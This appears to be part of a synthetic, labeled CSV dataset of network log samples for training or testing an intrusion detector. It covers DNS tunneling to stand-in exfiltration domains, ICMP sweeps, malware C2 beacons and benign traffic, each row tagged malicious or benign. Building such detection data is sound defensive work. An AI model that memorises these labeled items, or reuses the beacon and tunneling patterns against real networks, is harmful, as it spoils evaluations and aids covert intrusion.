+SNORT-P1-0137,dns_tunneling,udp,1716812016.44 DNS policy-pack-blob-16.segment1.data.exfil.example.com qtype=TXT src=10.40.1.36 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
+SNORT-P1-0138,dns_tunneling,dns,"2026-05-25T14:17:18Z zeek_dns uid=DNS017 id.orig_h=10.40.2.37 id.resp_h=8.8.4.4 proto=DNS query=""clientcache-segment-17.segment2.data.exfil.example.com"" qtype_name=TXT len=95 warning=""dns tunneling suspicion""",malicious
+SNORT-P1-0139,dns_tunneling,udp,1716812018.44 DNS opsdiag-record-18.segment3.data.exfil.example.com qtype=TXT src=10.40.0.38 dst=8.8.8.8 answers=0 note=long subdomain base64 burst,malicious
+SNORT-P1-0140,dns_tunneling,tcp,"2026-05-25T14:19:18Z zeek_dns uid=DNS019 id.orig_h=10.40.1.39 id.resp_h=8.8.4.4 proto=TCP query=""telemetry-bundle-19.segment4.data.exfil.example.com"" qtype_name=TXT len=97 warning=""dns tunneling suspicion""",malicious
+SNORT-P1-0141,icmp_sweep,icmp,2026-05-25T15:00:09Z icmp sweep src=198.51.100.140 targets=10.0.0.10-10.0.0.25 type=echo-request count=8 note=multiple hosts in 5s,malicious
+SNORT-P1-0142,icmp_sweep,icmp,1716818001.77 ICMP_SCAN src=198.51.100.141 dst_range=10.0.1.5-10.0.1.24 proto=ICMP icmp_type=8 multiple hosts=7 status=sweep,malicious
+SNORT-P1-0143,icmp_sweep,icmp,2026-05-25T15:02:09Z icmp sweep src=198.51.100.142 targets=10.2.4.10-10.2.4.30 type=echo-request count=10 note=multiple hosts in 5s,malicious
+SNORT-P1-0144,icmp_sweep,icmp,1716818003.77 ICMP_SCAN src=198.51.100.143 dst_range=172.16.1.10-172.16.1.18 proto=ICMP icmp_type=8 multiple hosts=9 status=sweep,malicious
+SNORT-P1-0145,icmp_sweep,icmp,2026-05-25T15:04:09Z icmp sweep src=198.51.100.144 targets=172.16.8.20-172.16.8.42 type=echo-request count=12 note=multiple hosts in 5s,malicious
+SNORT-P1-0146,icmp_sweep,icmp,1716818005.77 ICMP_SCAN src=198.51.100.145 dst_range=192.168.1.1-192.168.1.20 proto=ICMP icmp_type=8 multiple hosts=7 status=sweep,malicious
+SNORT-P1-0147,icmp_sweep,icmp,2026-05-25T15:06:09Z icmp sweep src=198.51.100.146 targets=192.168.10.10-192.168.10.40 type=echo-request count=9 note=multiple hosts in 5s,malicious
+SNORT-P1-0148,icmp_sweep,icmp,1716818007.77 ICMP_SCAN src=198.51.100.147 dst_range=192.168.50.2-192.168.50.12 proto=ICMP icmp_type=8 multiple hosts=9 status=sweep,malicious
+SNORT-P1-0149,icmp_sweep,icmp,2026-05-25T15:08:09Z icmp sweep src=198.51.100.148 targets=10.8.0.10-10.8.0.19 type=echo-request count=11 note=multiple hosts in 5s,malicious
+SNORT-P1-0150,icmp_sweep,icmp,1716818009.77 ICMP_SCAN src=198.51.100.149 dst_range=10.9.3.4-10.9.3.21 proto=ICMP icmp_type=8 multiple hosts=7 status=sweep,malicious
+SNORT-P1-0151,icmp_sweep,icmp,2026-05-25T15:10:09Z icmp sweep src=198.51.100.150 targets=172.20.5.10-172.20.5.22 type=echo-request count=8 note=multiple hosts in 5s,malicious
+SNORT-P1-0152,icmp_sweep,icmp,1716818011.77 ICMP_SCAN src=198.51.100.151 dst_range=172.20.6.10-172.20.6.24 proto=ICMP icmp_type=8 multiple hosts=9 status=sweep,malicious
+SNORT-P1-0153,icmp_sweep,icmp,2026-05-25T15:12:09Z icmp sweep src=198.51.100.152 targets=192.168.77.7-192.168.77.27 type=echo-request count=10 note=multiple hosts in 5s,malicious
+SNORT-P1-0154,icmp_sweep,icmp,1716818013.77 ICMP_SCAN src=198.51.100.153 dst_range=10.3.6.11-10.3.6.26 proto=ICMP icmp_type=8 multiple hosts=7 status=sweep,malicious
+SNORT-P1-0155,icmp_sweep,icmp,2026-05-25T15:14:09Z icmp sweep src=198.51.100.154 targets=10.4.7.15-10.4.7.35 type=echo-request count=12 note=multiple hosts in 5s,malicious
+SNORT-P1-0156,icmp_sweep,icmp,1716818015.77 ICMP_SCAN src=198.51.100.155 dst_range=172.18.9.10-172.18.9.29 proto=ICMP icmp_type=8 multiple hosts=9 status=sweep,malicious
+SNORT-P1-0157,icmp_sweep,icmp,2026-05-25T15:16:09Z icmp sweep src=198.51.100.156 targets=10.7.2.9-10.7.2.15 type=echo-request count=9 note=multiple hosts in 5s,malicious
+SNORT-P1-0158,icmp_sweep,icmp,1716818017.77 ICMP_SCAN src=198.51.100.157 dst_range=192.168.200.1-192.168.200.18 proto=ICMP icmp_type=8 multiple hosts=7 status=sweep,malicious
+SNORT-P1-0159,icmp_sweep,icmp,2026-05-25T15:18:09Z icmp sweep src=198.51.100.158 targets=10.10.10.10-10.10.10.28 type=echo-request count=11 note=multiple hosts in 5s,malicious
+SNORT-P1-0160,icmp_sweep,icmp,1716818019.77 ICMP_SCAN src=198.51.100.159 dst_range=172.31.0.3-172.31.0.19 proto=ICMP icmp_type=8 multiple hosts=9 status=sweep,malicious
+SNORT-P1-0161,malware_c2,https,"2026-05-25T16:00:31Z proxy src=10.50.0.10 dst=203.0.113.200 proto=HTTPS uri=""/beacon"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
+SNORT-P1-0162,malware_c2,http,"10.50.0.11 - - [25/May/2026:16:01:31 +0000] ""POST /gate.php HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
+SNORT-P1-0163,malware_c2,tcp,"2026-05-25T16:02:31Z proxy src=10.50.0.12 dst=203.0.113.202 proto=TCP uri=""/sync/api"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
+SNORT-P1-0164,malware_c2,dns,"2026-05-25T16:03:31Z zeek_dns uid=C2003 id.orig_h=10.50.0.13 id.resp_h=203.0.113.200 query=""cmd.3.beacon.example.net"" qtype_name=A note=periodic C2 callback every 120s",malicious
+SNORT-P1-0165,malware_c2,https,"2026-05-25T16:04:31Z proxy src=10.50.0.14 dst=203.0.113.204 proto=HTTPS uri=""/cdn/status"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
+SNORT-P1-0166,malware_c2,https,"10.50.0.15 - - [25/May/2026:16:05:31 +0000] ""POST /tasks/poll HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
+SNORT-P1-0167,malware_c2,http,"2026-05-25T16:06:31Z proxy src=10.50.0.16 dst=203.0.113.206 proto=HTTP uri=""/metrics/push"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
+SNORT-P1-0168,malware_c2,tcp,"10.50.0.17 - - [25/May/2026:16:07:31 +0000] ""POST /healthz HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
+SNORT-P1-0169,malware_c2,dns,"2026-05-25T16:08:31Z zeek_dns uid=C2008 id.orig_h=10.50.0.18 id.resp_h=203.0.113.200 query=""cmd.8.beacon.example.net"" qtype_name=A note=periodic C2 callback every 120s",malicious
+SNORT-P1-0170,malware_c2,https,"10.50.0.19 - - [25/May/2026:16:09:31 +0000] ""POST /edge/ping HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
+SNORT-P1-0171,malware_c2,https,"2026-05-25T16:10:31Z proxy src=10.50.0.20 dst=203.0.113.210 proto=HTTPS uri=""/news.png"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
+SNORT-P1-0172,malware_c2,http,"10.50.0.21 - - [25/May/2026:16:11:31 +0000] ""POST /api/v2/ping HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
+SNORT-P1-0173,malware_c2,tcp,"2026-05-25T16:12:31Z proxy src=10.50.0.22 dst=203.0.113.212 proto=TCP uri=""/fonts/css"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
+SNORT-P1-0174,malware_c2,dns,"2026-05-25T16:13:31Z zeek_dns uid=C2013 id.orig_h=10.50.0.23 id.resp_h=203.0.113.200 query=""cmd.13.beacon.example.net"" qtype_name=A note=periodic C2 callback every 120s",malicious
+SNORT-P1-0175,malware_c2,https,"2026-05-25T16:14:31Z proxy src=10.50.0.24 dst=203.0.113.214 proto=HTTPS uri=""/alive"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
+SNORT-P1-0176,malware_c2,https,"10.50.0.25 - - [25/May/2026:16:15:31 +0000] ""POST /image/check HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
+SNORT-P1-0177,malware_c2,http,"2026-05-25T16:16:31Z proxy src=10.50.0.26 dst=203.0.113.216 proto=HTTP uri=""/service/status"" interval=120s ua=""svc-update"" note=periodic beacon",malicious
+SNORT-P1-0178,malware_c2,tcp,"10.50.0.27 - - [25/May/2026:16:17:31 +0000] ""POST /device/pulse HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
+SNORT-P1-0179,malware_c2,dns,"2026-05-25T16:18:31Z zeek_dns uid=C2018 id.orig_h=10.50.0.28 id.resp_h=203.0.113.200 query=""cmd.18.beacon.example.net"" qtype_name=A note=periodic C2 callback every 120s",malicious
+SNORT-P1-0180,malware_c2,https,"10.50.0.29 - - [25/May/2026:16:19:31 +0000] ""POST /ajax/gif HTTP/1.1"" 200 64 ""-"" ""svc-update/1.0"" comment=""c2 heartbeat""",malicious
+SNORT-P1-0181,benign_traffic,http,2026-05-25T17:00:11Z access src=10.60.0.10 dst=10.70.0.20 proto=HTTP dpt=443 note=Normal user browsing corporate portal over HTTPS with regular GET /home and static CSS requests status=200 category=benign,benign
+SNORT-P1-0182,benign_traffic,https,2026-05-25T17:01:11Z access src=10.60.0.11 dst=10.70.0.21 proto=HTTPS dpt=443 note=CI/CD health check calling /readyz every 30 seconds from the build agent status=200 category=benign,benign
+SNORT-P1-0183,benign_traffic,dns,"2026-05-25T17:02:11Z dns_normal src=10.60.0.12 dst=10.70.0.53 query=""service2.internal.example.com"" qtype=A note=Monitoring probe resolving api.internal.example.com and db.internal.example.com benign=true",benign
+SNORT-P1-0184,benign_traffic,tcp,2026-05-25T17:03:11Z network event src=10.60.0.13 dst=10.70.0.23 proto=TCP dpt=22 note=Backup system connecting once per night to the storage bastion with successful SSH auth outcome=success benign traffic,benign
+SNORT-P1-0185,benign_traffic,icmp,2026-05-25T17:04:11Z icmp health src=10.60.0.14 dst=10.70.0.1 type=echo-request count=1 note=Network monitoring sending one ICMP echo request every 60 seconds to the router benign monitoring,benign
+SNORT-P1-0186,benign_traffic,http,2026-05-25T17:05:11Z access src=10.60.0.15 dst=10.70.0.25 proto=HTTP dpt=80 note=Search engine crawler fetching the public documentation pages at a low rate status=200 category=benign,benign
+SNORT-P1-0187,benign_traffic,https,2026-05-25T17:06:11Z access src=10.60.0.16 dst=10.70.0.26 proto=HTTPS dpt=443 note=Developer staging payload upload for a legitimate release artifact status=200 category=benign,benign
+SNORT-P1-0188,benign_traffic,dns,"2026-05-25T17:07:11Z dns_normal src=10.60.0.17 dst=10.70.0.53 query=""service7.internal.example.com"" qtype=A note=Legitimate long DNS TXT record for SPF and DKIM validation benign=true",benign
+SNORT-P1-0189,benign_traffic,tcp,2026-05-25T17:08:11Z network event src=10.60.0.18 dst=10.70.0.28 proto=TCP dpt=443 note=CDN edge reconnecting to the origin after a cache refresh outcome=success benign traffic,benign
+SNORT-P1-0190,benign_traffic,http,2026-05-25T17:09:11Z access src=10.60.0.19 dst=10.70.0.29 proto=HTTP dpt=8080 note=Internal admin testing of a diagnostics page without exploit markers status=200 category=benign,benign
+SNORT-P1-0191,benign_traffic,https,2026-05-25T17:10:11Z access src=10.60.0.20 dst=10.70.0.30 proto=HTTPS dpt=443 note=Payroll application session refresh from a managed workstation status=200 category=benign,benign
+SNORT-P1-0192,benign_traffic,dns,"2026-05-25T17:11:11Z dns_normal src=10.60.0.21 dst=10.70.0.53 query=""service11.internal.example.com"" qtype=A note=Automated certificate validation using an ACME DNS challenge benign=true",benign
+SNORT-P1-0193,benign_traffic,tcp,2026-05-25T17:12:11Z network event src=10.60.0.22 dst=10.70.0.32 proto=TCP dpt=8443 note=Asset inventory scanner collecting TLS banner metadata on approved hosts outcome=success benign traffic,benign
+SNORT-P1-0194,benign_traffic,http,2026-05-25T17:13:11Z access src=10.60.0.23 dst=10.70.0.33 proto=HTTP dpt=80 note=Public status page checked by uptime monitor with HEAD /status status=200 category=benign,benign
+SNORT-P1-0195,benign_traffic,https,2026-05-25T17:14:11Z access src=10.60.0.24 dst=10.70.0.34 proto=HTTPS dpt=443 note=SaaS webhook delivery retry after a temporary timeout status=200 category=benign,benign
+SNORT-P1-0196,benign_traffic,dns,"2026-05-25T17:15:11Z dns_normal src=10.60.0.25 dst=10.70.0.53 query=""service15.internal.example.com"" qtype=A note=Container platform resolving service names inside the cluster benign=true",benign
+SNORT-P1-0197,benign_traffic,tcp,2026-05-25T17:16:11Z network event src=10.60.0.26 dst=10.70.0.36 proto=TCP dpt=25 note=Mail relay sending queued notification messages to the SMTP gateway outcome=success benign traffic,benign
+SNORT-P1-0198,benign_traffic,http,2026-05-25T17:17:11Z access src=10.60.0.27 dst=10.70.0.37 proto=HTTP dpt=8080 note=QA team browsing a demo environment with harmless query parameters status=200 category=benign,benign
+SNORT-P1-0199,benign_traffic,icmp,2026-05-25T17:18:11Z icmp health src=10.60.0.28 dst=10.70.0.1 type=echo-request count=1 note=Single ICMP echo request from the NOC dashboard after packet loss alert benign monitoring,benign
+SNORT-P1-0200,benign_traffic,https,2026-05-25T17:19:11Z access src=10.60.0.29 dst=10.70.0.39 proto=HTTPS dpt=443 note=Finance report download from the internal portal with valid session cookies status=200 category=benign,benign
